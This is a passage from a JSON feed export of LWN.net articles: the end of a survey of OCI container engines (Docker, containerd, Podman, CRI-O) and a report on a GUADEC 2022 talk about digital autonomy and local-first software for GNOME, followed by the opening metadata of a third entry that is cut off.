self-hosted.\nOther implementations of the specification include Red Hat's <a href=\"https://quay.io/\">Quay</a> \nand VMware's  <a href=\"https://goharbor.io/\">Harbor</a>, as well as hosted\nofferings from <a href=\"https://aws.amazon.com/ecr/\">Amazon</a>, <a href=\"https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry\">GitHub</a>,\n<a href=\"https://docs.gitlab.com/ee/user/packages/container_registry/\">GitLab</a>, \nand <a href=\"https://cloud.google.com/container-registry/\">Google</a>.\n</p>\n\n<p>A program that implements the <a href=\"https://github.com/opencontainers/runtime-spec/blob/main/spec.md\">OCI\nruntime specification</a> is responsible for everything pertaining to\nactually running a container.  It sets up any necessary mounts, control groups, and\nkernel namespaces, executes processes inside the container, and\ntears down any container-related resources once all the processes inside of\nit have exited.  The reference implementation of the runtime specification\nis <a href=\"https://github.com/opencontainers/runc\">runc</a>, which was\ncreated by Docker for the OCI.  </p>\n\n<p>There are a number of other OCI runtimes to choose from.  For example, <a href=\"https://github.com/containers/crun\">crun</a> offers an OCI runtime\nwritten in C that has the goal of being faster and more lightweight than runc,\nwhich, like most of the rest of the OCI ecosystem, is written in Go.\nGoogle's <a href=\"https://gvisor.dev/\">gVisor</a> includes runsc, which\nprovides greater isolation from the host by running applications on top of\na <a href=\"https://gvisor.dev/docs/\">user-mode kernel</a>.  Amazon's <a href=\"https://firecracker-microvm.github.io/\">Firecracker</a> is a minimal\nhypervisor written in Rust that can use KVM to give each container its own virtual machine;\nIntel's <a href=\"https://katacontainers.io/\">Kata Containers</a> works\nsimilarly but supports multiple hypervisors (including Firecracker.)  </p>\n\n<p>A container engine is a program that ties these three specifications\ntogether.  It implements the client side of the distribution specification\nto retrieve container images from registries, interprets the images it has\nretrieved according to the image specification, and launches containers\nusing a program that implements the runtime specification.  A container\nengine provides tools and/or APIs for users to manage container images,\nprocesses, and storage.  </p>\n\n<p><a href=\"https://kubernetes.io/\">Kubernetes</a> is a container\norchestrator, capable of scheduling and running containers across hundreds\nor even thousands of servers.  Kubernetes does not implement any of the OCI\nspecifications itself.  It needs to be used in combination with a container\nengine, which manages containers on behalf of Kubernetes.  The interface\nthat it uses to communicate with container engines is called the <a href=\"https://kubernetes.io/docs/concepts/architecture/cri/\">Container\nRuntime Interface</a> (CRI).  </p>\n\n<h4>Docker</h4>\n\n<p>Docker is the original OCI container engine.  It consists of two main\nuser-visible components: a <a href=\"https://github.com/docker/cli\">command-line-interface (CLI)\nclient</a> named <tt>docker</tt>, and \na server.  The server is named <tt>dockerd</tt> in Docker's own packages,\nbut the repository was renamed <a href=\"https://github.com/moby/moby/\">moby</a> when Docker created the <a href=\"https://mobyproject.org/\">Moby Project</a> in 2017.\nThe Moby Project is an umbrella organization that develops open-source\ncomponents used by Docker and other container engines. \n When Moby was\nannounced, many found the relationship between Docker and the Moby project\nto be <a href=\"https://www.theregister.com/2017/04/21/docker_renames_open_source_code_moby/\">confusing</a>; \nit has been <a href=\"https://www.cio.com/article/234826/why-docker-created-the-moby-project.html\">described</a> as being similar to the relationship\nbetween Fedora and Red Hat.  </p>\n\n<p><tt>dockerd</tt> provides an <a href=\"https://docs.docker.com/engine/api/\">HTTP API</a>; it usually listens\non a Unix socket named <tt>/var/run/docker.sock</tt>, but can be made to\nlisten on a TCP socket as well.  The <tt>docker</tt> command is merely a client\nto this API; the server is responsible for downloading images and starting\ncontainer processes.  The client supports starting containers in the\nforeground, so that running a container at the command-line behaves\nsimilarly to running any other program, but this is only a simulation.  In\nthis mode, the container processes are still started by the server, and\ninput and output are streamed over the API socket; when the process exits,\nthe server reports that to the client, and then the client sets its own\nexit status to match.  </p>\n\n<p>This design <a href=\"https://github.com/moby/moby/issues/6791\">does not\nplay well with systemd</a> or other process supervision tools, because the\nCLI never has any child processes of its own.  Running the <tt>docker</tt>\nCLI under a process supervisor only results in supervising the CLI process.\nThis has a variety of consequences for users of these tools. For example,\nany attempt to limit a container's memory usage by running the CLI as a\nsystemd service will fail; the limits will only apply to the CLI and its\nnon-existent children.  In addition, attempts to terminate a client process may not\nresult in terminating all of the processes in the container.  </p>\n\n<p>Failure to <a href=\"https://docs.docker.com/engine/security/protect-access/\">limit\naccess to Docker's socket</a> can be a significant security hazard.  By\ndefault <tt>dockerd</tt> runs as root.  Anyone who is able to connect to\nthe Docker socket has complete access to the API.  Since the API allows\nthings like running a container as a specific UID and binding arbitrary\nfilesystem locations, it is trivial for someone with access to the socket\nto <a href=\"https://gtfobins.github.io/gtfobins/docker/\">become root</a> on\nthe host.  <a href=\"https://docs.docker.com/engine/security/rootless/\">Support for\nrunning in rootless mode</a> was added in 2019 and stabilized in 2020, but\nis still not the default mode of operation.  </p>\n\n<p>Docker can be used by Kubernetes to run containers, but it doesn't\ndirectly support the CRI specification.  Originally, Kubernetes included a\ncomponent called <tt>dockershim</tt> that provided a bridge between the CRI\nand the Docker API, but it was <a href=\"https://kubernetes.io/blog/2020/12/02/dont-panic-kubernetes-and-docker/\">deprecated</a>\nin 2020.  The code was <a href=\"https://www.mirantis.com/blog/mirantis-to-take-over-support-of-kubernetes-dockershim-2/\">spun\nout of the Kubernetes repository</a> and is now maintained separately as <a href=\"https://github.com/Mirantis/cri-dockerd\">cri-dockerd</a>.  </p>\n\n<h4>containerd &amp; nerdctl</h4>\n\n<p>Docker refactored its software into independent components in 2015;\n<a href=\"https://containerd.io/\">containerd</a> is one of the fruits of\nthat effort.  In 2017,\nDocker donated containerd to the <a href=\"https://www.cncf.io/\">Cloud\nNative Computing Foundation</a> (CNCF), which stewards the development of\nKubernetes and other tools.  It is still included in Docker, but it can\nalso be used as a standalone container engine, or with Kubernetes via an included <a href=\"https://github.com/containerd/containerd/blob/main/docs/cri/architecture.md\">CRI\nplugin</a>.  The architecture of containerd is <a href=\"https://github.com/containerd/containerd/blob/main/docs/PLUGINS.md\">highly\nmodular</a>.  This flexibility helps it to serve as a proving ground for\nexperimental features.  Plugins may provide support for different ways of\nstoring container images and additional image formats, for example.  </p>\n\n<p>Without any additional plugins, containerd is effectively a subset of\nDocker; its core features map closely to the OCI specifications.  Tools\ndesigned to work with Docker's API cannot be used with containerd.\nInstead, it provides an API based on Google's <a href=\"https://grpc.io/\">gRPC</a>.  Unfortunately, concerned system\nadministrators looking for access control won't find it here; despite being\nincompatible with Docker's API, containerd's API appears to carry all of\nthe same security implications.  </p>\n\n<p>The documentation for containerd notes that it follows a <a href=\"https://github.com/containerd/containerd/blob/main/docs/PLUGINS.md#smart-client-model=\">smart\nclient</a> model (as opposed to Docker's \"dumb client\").  Among other\ndifferences, this means that containerd does not communicate with container\nregistries; instead, (smart) clients are required to download any images they need\nthemselves.  Despite the difference in client models, containerd still has\na process model similar to that of Docker; container processes are forked\nfrom the containerd process.  In general, without additional software,\ncontainerd doesn't do anything differently from Docker, it just does less.\n</p>\n\n<p>When containerd is bundled with Docker, <tt>dockerd</tt> serves as the\nsmart client, accepting Docker API calls from its own dumb client and doing\nany additional work needed before calling the containerd API; when used\nwith Kubernetes, these things are handled by the CRI plugin.  Other than\nthat, containerd didn't really have its own client until relatively\nrecently.  It includes a bare-bones CLI called <tt>ctr</tt>, but this is\nonly intended for debugging purposes.  </p>\n\n<p>This changed in December 2020 with the release of <a href=\"https://github.com/containerd/nerdctl\">nerdctl</a>.  Since its\nrelease, running containerd on its own has become much more practical;\nnerdctl features a user interface designed to be compatible with the Docker\nCLI and provides much of the functionality Docker users would find missing\nfrom a standalone containerd installation.  Users who don't need\ncompatibility with the Docker API might find themselves quite happy with\ncontainerd and nertdctl.  </p>\n\n<h4>Podman</h4>\n\n<p><a href=\"https://podman.io/\">Podman</a> is an alternative to Docker\nsponsored by Red Hat, which aims to be a drop-in replacement for Docker.\nLike Docker and containerd, it is written in Go and released under the\nApache 2.0 License, but it is not a fork; it is an independent\nreimplementation.  Red Hat's sponsorship of Podman is likely to be at least\npartially motivated by the difficulties it encountered during its <a href=\"https://lwn.net/Articles/676831/\">efforts</a> to make Docker's software\ninteroperate with systemd.  </p>\n\n<p>On a superficial level, Podman appears nearly identical to Docker.  It\ncan use the same container images, and talk to the same registries.  The\n<tt>podman</tt> CLI is a clone of <tt>docker</tt>, with the intention that\nusers migrating from Docker can alias <tt>docker</tt> to <tt>podman</tt> and mostly\ncontinue with their lives as if nothing had changed.  \n</p>\n\n<p>\nOriginally, Podman\nprovided an API based on the <a href=\"https://varlink.org/\">varlink</a>\nprotocol.  This meant that while Podman was compatible with Docker on a CLI\nlevel, tools that used the Docker API directly could not be used with\nPodman.  In version 3.0, the varlink API was <a href=\"https://podman.io/blogs/2020/08/01/deprecate-and-remove-varlink-notice.html\">scrapped\nin favor of an HTTP API</a>, which aims to be compatible with the one\nprovided by Docker while also adding some Podman-specific\nendpoints.  This new API is maturing rapidly, but users of tools designed\nfor Docker would be well-advised to test for compatibility before\ncommitting to switch to Podman.  </p>\n\n<p>As it is largely a copy of Docker's API, Podman's API doesn't\nfeature any sort of access control, but Podman has some architectural\ndifferences that may make that less important.  Podman gained support for\nrunning in rootless mode early on in its development.  In this mode,\ncontainers can be created without root or any other special privileges,\naside from that small bit of help from <a href=\"https://man7.org/linux/man-pages/man1/newuidmap.1.html\"><tt>newuidmap</tt></a>\nand <a href=\"https://man7.org/linux/man-pages/man1/newgidmap.1.html\"><tt>newgidmap</tt></a>.\nUnlike Docker, when Podman is invoked by a non-root user, rootless mode is\nused by default.  </p>\n\n<p>Users of Podman can also dodge security concerns about its API socket by\nsimply disabling it.  Though its interface is largely identical to the\nDocker CLI, <tt>podman</tt> is no mere API client.  It creates containers\nfor itself without any help from a daemon.  As a result, Podman plays\nnicely with tools like systemd; using <tt>podman run</tt> with a process\nsupervisor works as expected, because the processes inside the container\nare children of <tt>podman run</tt>.  The developers of Podman encourage\npeople to use it in this way by a command to <a href=\"https://docs.podman.io/en/latest/markdown/podman-generate-systemd.1.html\">generate\nsystemd units for Podman containers</a>.  </p>\n\n<p>Aside from its process model, Podman caters to systemd users in other\nways.  While running an init system such as systemd inside of a container\nis antithetical to the Docker philosophy of one application per container,\nPodman goes out of its way to make it easy.  If the program to run specified\nby the container <a href=\"https://manpages.debian.org/bullseye/podman/podman-run.1.en.html#--systemd=true%7Cfalse%7Calways\">is\nan init system</a>, Podman will automatically\nmount all the kernel filesystems needed for systemd to function.  It also\nsupports reporting the status of containers to systemd via <a href=\"https://www.freedesktop.org/software/systemd/man/sd_notify.html\"><tt>sd_notify()</tt></a>,\nor handing the notification socket off to the application inside of the\ncontainer for it to use directly.  </p>\n\n<p>Podman also has some features designed to appeal to Kubernetes users.\nLike Kubernetes, it supports the notion of a \"pod\", which is a group of\ncontainers that share a common network namespace.  It can <a href=\"https://docs.podman.io/en/latest/markdown/podman-kube-play.1.html\">run\ncontainers using Kubernetes configuration files</a> and also <a href=\"https://docs.podman.io/en/latest/markdown/podman-generate-kube.1.html\">generate\nKubernetes configurations</a>.  However, unlike Docker and containerd,\nthere is no way for Podman to be used by Kubernetes to run containers.\nThis is a deliberate omission. Instead of adding CRI support to Podman,\nwhich is a general-purpose container engine, Red Hat chose to <a href=\"https://www.redhat.com/en/blog/why-red-hat-investing-cri-o-and-podman\">sponsor\nthe \ndevelopment of a more specialized alternative</a> in the form of <a href=\"https://github.com/cri-o/cri-o\">CRI-O</a>.  \n</p>\n\n<h4>CRI-O</h4>\n\n<p>CRI-O is based on many of\nthe <a href=\"https://github.com/containers/image\">same</a> <a href=\"https://github.com/containers/storage\">underpinnings</a> as Podman.\nSo the relationship between CRI-O and Podman could be said to be\nsimilar to the one between containerd and Docker; CRI-O delivers much of\nthe same technology as Podman, with fewer frills.  This analogy doesn't\nstretch far, though.  Unlike containerd and Docker, CRI-O and Podman\nare completely separate projects; one is not embedded by the other.  </p>\n\n<p>As might be suggested by its name, CRI-O implements the Kubernetes CRI.\nIn fact, that's all that it implements; CRI-O is built specifically and\nonly for use with Kubernetes.  It is developed in lockstep with the\nKubernetes release cycle, and anything that is not required by the CRI is\nexplicitly declared to be out of scope.  CRI-O cannot be used without\nKubernetes and includes no CLI of its own; based on the stated goals of the\nproject, any attempt to make CRI-O suitable for standalone use would likely\nbe viewed as an unwelcome distraction by its developers.  </p>\n\n<p>Like Podman, the development of CRI-O was initially sponsored by Red Hat;\nlike containerd, it was later <a href=\"https://www.redhat.com/en/blog/red-hat-contributes-cri-o-cloud-native-computing-foundation\">donated\nto the CNCF</a> in 2019.  Although they are now both under the aegis of\nthe same organization, the narrow focus of CRI-O may make it more appealing\nto Kubernetes administrators than containerd.  The developers of CRI-O are\nfree to make decisions solely on the basis of maximizing the benefit to\nusers of Kubernetes, whereas the developers of containerd and other\ncontainer engines have many other types of users and uses cases to\nconsider.  </p>\n\n<h4>Conclusion</h4>\n\n<p>These are just a few of the most popular container engines; other\nprojects like <a href=\"https://apptainer.org/\">Apptainer</a> and <a href=\"https://pouchcontainer.io/\">Pouch</a> cater to different ecological\nniches.  There are also a number of tools available for creating and\nmanipulating container images, like <a href=\"https://github.com/containers/buildah/\">Buildah</a>, <a href=\"https://buildpacks.io/\">Buildpacks</a>, <a href=\"https://github.com/containers/skopeo\">skopeo</a>, and <a href=\"https://umo.ci/\">umoci</a>.  Docker deserves a great deal of credit\nfor the Open Container Initiative; the standards and the software that have\nresulted from this effort have provided the foundation for a wide array of\nprojects.  The ecosystem is robust; should one project shut \ndown, there are multiple alternatives ready and available to take its\nplace.  As a result, the future of this technology is no longer tied to one\nparticular company or project; the style of containers that Docker pioneered\nseems likely to be with us for a long time to come.  </p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/GuestIndex/\">GuestArticles</a></td><td><a href=\"https://lwn.net/Archives/GuestIndex/#Webb_Jordan\">Webb, Jordan</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "902463",
    "timestampUsec": "1658963600095250",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Digital autonomy and the GNOME desktop",
    "author": ";jake",
    "published": 1658959680,
    "updated": 1658959680,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902463/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>July 27, 2022\n           <hr>\n<a href=\"https://lwn.net/Archives/ConferenceIndex/#GUADEC-2022\">GUADEC</a>\n</div>\n<p>\nWhile GUADEC, the GNOME community's annual conference, has always been held\nin Europe (or online-only) since it began in 2000, <a href=\"https://events.gnome.org/event/77/\">this year's edition</a>\nwas held in North America, specifically in Guadalajara, México,\nJuly 20-25.  Rob McQueen gave a talk on the first day of the\nconference about providing solutions that bring some level of digital\nsafety and\nautonomy to users—and how GNOME can help make that happen.  McQueen \nis the CEO of the <a href=\"https://www.endlessos.org/\">Endless OS\nFoundation</a>, which is an organization geared toward those goals; he \nwas also\nrecently reelected as the president of the <a href=\"https://foundation.gnome.org/\">GNOME \nFoundation</a> board of directors. \n</p>\n\n<p>\nHis talk was meant to introduce and describe an objective that the GNOME\nboard has been discussing and working on regarding the state of the\ninternet today and how GNOME can make that experience better for its\nusers.  The cloud-focused computing environment that is prevalent today has\na number of problems that could be addressed by such an effort. That topic\nis related to what he \ndoes for work, as well, since Endless OS is working \non \"bridging the digital divide\" by helping those who are not able to access\nall of the information that is available on today's internet.   Some of\nthose efforts are aimed at bringing that data to those who cannot, or\nperhaps choose not to, directly connect to the internet itself—or only do\nso sporadically.\n</p>\n\n<h4>The problems</h4>\n\n<p>\nThe UN estimates that there will be 2.5 billion more people on the planet\nby 2050; most of those people, perhaps 2 billion of them, will be\nborn in places where power and connectivity, thus technology, are quite\nlimited.  Meanwhile, there are more smartphones on the planet than people,\nbut both Endless and GNOME have an interest in desktop computing.  In order\nfor people\nto fully participate in the activities that computing can facilitate, such\nas education, employment, content creation, and more, a form-factor beyond\nwhat a phone provides is needed.\n</p>\n\n<a href=\"https://lwn.net/Articles/902677/\">\n<img src=\"https://static.lwn.net/images/2022/guadec-mcqueen-sm.png\" align=\"left\" border=\"0\" hspace=\"5\" alt=\"[Rob McQueen]\" title=\"Rob McQueen\" width=\"260\" height=\"239\">\n</a>\n\n<p>\nComputers these days use a <i>lot</i> of internet, he said.  Many users\nhave workloads that are split between the computer in front of them and one\nin the cloud.  That creates infrastructure constraints for personal\ncomputing; there is more needed than just a device.  That infrastructure\nconsists of all of the disparate pieces that allow the connection to the\nrest of world: trenches, wires, \ntowers, satellites, and more.\n</p>\n\n<p>\nSome predictions are that in around ten years, satellites and other\ntechnology will solve the global connectivity problem, he said.  But\nhe has been working in the \"digital divide space\" for around ten years and\nthat prediction was also made ten years ago. Matching the growth in global population with\nconnectivity infrastructure  is an extremely difficult\nand expensive\nproblem to solve.\n</p>\n\n<p>\nEven if you do have the internet connectivity, though, there are still\nplenty of problems.  In the free-software world, we are able to examine the\nsoftware that we run on the computer in front of us, McQueen said. When\nsoftware is running in the cloud, which is effectively just someone else's\ncomputer as the snarky definition that he referred to notes, that ability\nis not present.  Running it elsewhere means that \nthe user loses control of their data, including: if and how well\nthe data is secured,\nwhether it is shared with third parties, whether they will still be able to\naccess it tomorrow, and so on.\n</p>\n\n<p>\nData that is centralized is also a target for attack, he said.  There are\nenormous resources being poured into securing these centralized resources\nthese days.  The problem has risen to a level of national concern; for\nexample, the Biden administration in the US has a panel that is advising it on how to\nsecure the internet and the infrastructure it runs on.\n</p>\n\n<a href=\"https://lwn.net/Articles/902676/\">\n<img src=\"https://static.lwn.net/images/2022/guadec-fdff-sm.png\" align=\"right\" border=\"0\" hspace=\"5\" alt=\"[Flash Drives for Freedom]\" title=\"Flash Drives for Freedom\" width=\"250\" height=\"184\">\n</a>\n\n<p>\nLoss of data control can have \"very real-world consequences\".  For example,\napps that track menstrual cycles, with the convenience of syncing the data\nto the cloud, can also reveal things that could be dangerous from a legal\nperspective in the US today.  Given the current climate in the US, he\nsaid, health data could potentially put someone or their healthcare provider in\nlegal trouble, \"or it could even put your life at\nrisk—this is terrifying.\"\n</p>\n\n<p>\nThen there are governments that are trying to quell dissent by use of\ninternet blockages of various sorts.  For example, Russia has been limiting\naccess to sites that provide a more balanced view of its war on Ukraine\nbecause it has its own narrative to promote.  He noted that the <a href=\"https://netblocks.org/\">NetBlocks</a> organization maps these kinds\nof network disruptions and tries to tie them to the real-world events that may have\ntriggered them.  He said that he could not resist mentioning <a href=\"https://flashdrivesforfreedom.org/\">Flash Drives for Freedom</a>,\nwhich creates USB drives containing suppressed information that get\nsmuggled into North Korea; the visual impact of its home page image (seen\nat right) was \"too good not to include\" in his slides.\n</p>\n\n<h4>Solutions?</h4>\n\n<p>\nHe had just presented \"some of the consequences of the way we approach\ncomputing\" today; he does not have an \"amazing answer\" of what should be\ndone, but he did have some questions, ideas, and things that are \"worth\nexploring together\".  GNOME has a focus on software that runs locally, in part\nbecause that puts users in control of their data and gives them the ability\nto look at the source code; ultimately, the project believes those things allow\nusers to have more trust in their computing environment.  \n</p>\n\n<p>\nMcQueen asked a few different questions about how the GNOME project could improve\nin some of these areas.\nWhat can the project add to its desktop to provide more safety for its\nusers and to allow them to have better control over their data?  What can\nit do to help users who live in a country that gets cut off from the\ninternet due to a war?  How can the GNOME desktop help block various kinds\nof threats to its users and their data?\n</p>\n\n<p>\nHe explained that there are other organizations out there solving some of\nthese problems; GNOME could potentially partner with them to use their\ntechnology in its desktop in order to accomplish these goals. He listed\nseveral different technology areas that would fit well into the GNOME\ndesktop. The first of those  was regarding offline content.\n</p>\n\n<p>\nStorage is a reasonable substitute to deal with connectivity woes that come\nabout due to lack of infrastructure, upheavals like wars, \nor censorship of various kinds.  There are a number of projects that exist\nfor \"bringing bits of the internet onto the computer in front of you\".  For\nexample, <a href=\"https://www.kiwix.org/en/\">Kiwix</a> has technology for\ndownloading entire web sites, such as Wikipedia, and making them available\noffline.  It turns out that Wikipedia in Russian has been <a href=\"https://blog.legoktm.com/2022/03/15/how-to-mirror-the-russian-wikipedia-with-debian-and-kiwix.html\">seeing\nincreased downloads on Kiwix</a> of late since \"<q>the Russian government has\nthreatened to block access to Wikipedia for documenting narratives that do\nnot agree with the official position </q>\". \n</p>\n\n<p>\nEndless OS is collaborating with <a href=\"https://learningequality.org/\">Learning Equality</a>, which is a\nnon-profit that has created a learning platform called <a href=\"https://learningequality.org/kolibri/\">Kolibri</a>.  It allows\naccessing educational resources, including ebooks, videos, audio,\nand games, in a curated set of courses for offline schools.  The <a href=\"https://www.endlessos.org/key\">Endless Key</a> project uses Kolibri\nto create offline educational resources for US middle and high school students who do\nnot have internet access at home.\n</p>\n\n<p>\nHe then turned to peer-to-peer technology, which is where he started his\ncareer; after 15 years of working on that, he has learned that it is\nan extremely difficult problem to solve.  He looked for good examples of\npeer-to-peer tools for the desktop and came up with two.  The first is <a href=\"https://syncthing.net/\">Syncthing</a> (which we <a href=\"https://lwn.net/Articles/861978/\">looked at</a> a year ago); it is \"kind of a\ndecentralized Dropbox\".  It is a bit difficult to configure, but once that\nis done, file folders will be synchronized between multiple devices either\nover the local network or using cloud servers.\n</p>\n\n<p>\nThe other example is <a href=\"https://onedoes.github.io/snapdrop/\">Snapdrop</a>, which is \"so\nsimple and so cool\".  It is a web application that discovers other devices\non the network and allows drag-and-drop file transfer among them.  Since it\nis web-based, it is device independent, but it does require that the\ndevices are online to access the web page.  The transfer happens in a\npeer-to-peer fashion,\nbut the application gets loaded from the cloud.\n</p>\n\n<h4>Local first</h4>\n\n<p>\nThe third technology area that McQueen wanted to talk about was local-first\nsoftware.  He had borrowed some slides from Peter van Hardenberg at <a href=\"https://www.inkandswitch.com/\">Ink &amp; Switch</a>, which is an\n\"industrial research group\" that has been working on <a href=\"https://www.inkandswitch.com/local-first/\">local-first software</a>\nfor the last five years.  Those researchers have come up with a manifesto\nof sorts, with seven principles, or ideals, that describe software that is not completely\nreliant on the network or the cloud, but still provides many of the same\nfeatures and benefits that users have come to expect.\n</p>\n\n<p>\nThe first of these ideals is <a href=\"https://www.inkandswitch.com/local-first/#1-no-spinners-your-work-at-your-fingertips\">\"no spinners\"</a>; the user's work is actually on the\ndevice in front of them.  But on the flipside, their work is <a href=\"https://www.inkandswitch.com/local-first/#2-your-work-is-not-trapped-on-one-device\">not trapped on\na single device</a>; through some mechanism, replicas are kept in sync on other\ndevices of interest.  <a href=\"https://www.inkandswitch.com/local-first/#3-the-network-is-optional\">The\nnetwork is optional</a>, however; when it is present, \nsynchronization can happen, but work can still be done without it.  The\n<a href=\"https://www.inkandswitch.com/local-first/#4-seamless-collaboration-with-your-colleagues\">fourth\nitem</a> is that seamless collaboration is a requirement today; it has \nbecome an\nindispensable feature that needs to be incorporated in any synchronization\nmechanisms that arise.\n</p>\n\n<p>\nThe data that gets stored <a href=\"https://www.inkandswitch.com/local-first/#5-the-long-now\">needs to\nremain accessible</a> even if the software \nthat uses it goes away.  Digital archivists (and others) worry that we are\nstoring much of the data about our life today in ways that will not be\naccessible 20, or even ten or less, years on.  For example, it could\nbecome impossible to access a document made in Google Docs sometime down\nthe road.  Avoiding that has benefits both for individual users and for\nsociety as a whole.\n</p>\n\n<p>\nLocal-first software has an advantage of having <a href=\"https://www.inkandswitch.com/local-first/#6-security-and-privacy-by-default\">privacy\nand security built-in</a> because it is not storing its data \nin some centralized cloud location that becomes a huge temptation for\nattackers.  That centralized storage is also susceptible to various misdeeds\nby the companies controlling it—or their employees.  Local-first gives users <a href=\"https://www.inkandswitch.com/local-first/#7-you-retain-ultimate-ownership-and-control\">ultimate\nownership and control</a> of their data.   No cloud-based application\nprovider can cut off access due to its whim or at the behest of, say, an\noppressive government regime.\n</p>\n\n<p>\nMcQueen recommended that people visit the Ink &amp; Switch site to find out\nmore.  The group has done more than just think about local-first software;\nit has done some <a href=\"https://www.inkandswitch.com/local-first/#towards-a-better-future\">work</a>\non using <a href=\"https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type\">conflict-free\nreplicated data types</a> (CRDTs), which provide eventual consistency for\ndata that is being updated in multiple places.  The data structure is a\ngood basis for collaborative tools that can seamlessly move between\nconnected and unconnected modes, he said.\n</p>\n\n<h4>Development</h4>\n\n<p>\nThere is also a case to be made that today's cloud applications are overly\nexpensive to build and operate.  They are usually written in several tiers:\none for the web-based user interface, a layer for business logic, an API\nlayer that provides access to a \nstorage/database layer, and so on.  These often use different programming\nlanguages and it all leads to a complex distributed application that can be\ndifficult to scale. He put up a slide of the <a href=\"https://landscape.cncf.io/\">Cloud Native landscape</a>, as an example\nof the complexity that arises for cloud applications.\n</p>\n\n<p>\nIn the self-contained software world, we have a longstanding tradition of\nwriting code that \"we can reason about\", he said; it is architecturally fairly\nsimple, generally having fewer code bases and using less languages.  The goal of local-first\nsoftware is not to reject the cloud, but it is \"about rethinking the\nrelationship with the cloud\".  The cloud has a role in helping to\nsynchronize the data, improving its availability, and in providing\nadditional compute power.  With proper key management (\"asterisk, it's\ncomplicated\"), data can be end-to-end encrypted so that the cloud becomes a\npassive carrier rather than an active participant.\n</p>\n\n<p>\nThe GNOME Foundation has identified three areas that it plans to provide\nfunding for in the coming years.  One is to help bootstrap an\napp store for GNOME; another is to work on improving the diversity within\nthe GNOME community.  The third is to look at ways to integrate\ndecentralized and local-first technologies into the GNOME desktop.\nMcQueen thinks that GNOME is well-positioned to take a lead on bringing\nsome of these technologies to its users.  For one thing, GNOME is \"very\nopinionated\" about how its software looks and operates.  Applying that same\napproach to local-first software makes sense.  \n</p>\n\n<p>\nHe had some examples of existing tools that already embody some parts of\nthe local-first approach.  <a href=\"https://flathub.org/apps/details/com.github.birros.WebArchives\">WebArchives</a>\nis an application that loads Kiwix files for offline viewing of Wikipedia\nand other sites.  Endless has an <a href=\"https://endlessos.com/endless-os/encyclopidia/\">Encyclopedia</a>\napplication that is similar, but it is integrated with the desktop search\non Endless OS as well.  Encyclopedia is currently a separate GTK-based\napplication, but Endless is \nmoving toward integrating all of that into Kolibri for the future, he said.\n</p>\n\n<p>\nIn the realm of peer-to-peer applications, there is <a href=\"https://gitlab.gnome.org/jsparber/teleport\">Teleport</a>, which\ndiscovers other Teleport-ready devices on the local network and allows\ntransferring files between them.  One limitation is that all of the\nparticipants need to be running GNOME, but it provides an example of an\napplication that is easy to set up, which could perhaps be merged with\ntechniques from Syncthing or Snapdrop.\n</p>\n\n<p>\n<a href=\"https://github.com/automerge\">Automerge</a> is another project\nthat could be useful for GNOME; it provides a library to do CRDT handling\nfor collaborative applications.  It was originally JavaScript-based, but\nhas been <a href=\"https://github.com/automerge/automerge-rs\">rewritten in\nRust</a>, which has the advantage of moving away from the \"millions of\nlines of crusty C code that we are running on top of\".  Using the GTK Rust\nbindings along with Automerge will allow GNOME to start experimenting with\nlocal-first collaborative applications, he said.\n</p>\n\n<p>\nHe wrapped up by talking about several kinds of applications where it would\nbe useful to have access to the same data in multiple locations\n<i>without</i> making that data available to cloud providers.  For example,\nhealth-tracking applications (such as <a href=\"https://apps.gnome.org/app/dev.Cogitri.Health/\">GNOME Health</a>)\nwould benefit from synchronization across devices, but that data is of a\nparticularly personal nature, of course.  Contact lists and calendars are\nadditional kinds of applications where multi-device synchronization and\n(limited) sharing among collaborators make a lot of sense.\nMcQueen thinks that GNOME is in a great position to help set the stage for\nthe computing experience of those 2.5 billion people who are\n\"arriving\" over the next 30 years or so.  The GNOME Foundation is only\none voice in the project, however, so he is hoping to see others join in to\nwork on various aspects of it.\n</p>\n\n<p>\nA <a href=\"https://youtu.be/wuFTiAcdBXk?t=15955\">YouTube video</a> of the talk\nis available, though the audio volume is rather low.\n</p><p>\n\n</p><p>\n[I would like to thank LWN subscribers for supporting my trip to\nGuadalajara, México for GUADEC.]<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/ConferenceIndex/\">Conference</a></td><td><a href=\"https://lwn.net/Archives/ConferenceIndex/#GUADEC-2022\">GUADEC/2022</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "902466",
    "timestampUsec": "1659022985804275",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Security requirements for new kernel features",
    "author": ";corbet",
    "published": 1659018540,
    "updated": 1659018540,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902466/",
            "type": "text/html"
        }
    ],
    "content": {
